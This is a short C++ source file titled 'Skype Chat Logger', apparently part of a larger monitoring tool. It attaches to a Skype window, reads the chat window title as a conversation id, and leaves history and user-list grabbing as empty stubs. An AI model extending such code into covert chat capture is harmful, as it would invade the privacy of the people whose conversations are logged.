/*
* Skype Chat Logger
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <exception>
using namespace std;

#include "QSkype2.h"
#include "QOleWalker.h"
#include "QSkype.h"
#include "..\HM_SafeProcedures.h"

QSkype2::QSkype2(const HWND hwnd){
	ole.Init();
	ole.SetHandle(hwnd);

	properties.SetHandle(hwnd);
}

QSkype2::~QSkype2(){
	ole.Clean();
	ole.UnInit();
}

BOOL QSkype2::GrabHistory() {
	//throw "Not yet implemented";
	return FALSE;
}

BOOL QSkype2::GrabTopic() {
	WCHAR wTitle[256] = {0};

	if(properties.GetHandle() == NULL)
		return FALSE;

	HM_SafeGetWindowTextW(properties.GetHandle(), wTitle, 256);

	return properties.SetId(wTitle);
}

BOOL QSkype2::GrabUserList() {
	//throw "Not yet implemented";
	return FALSE;
}


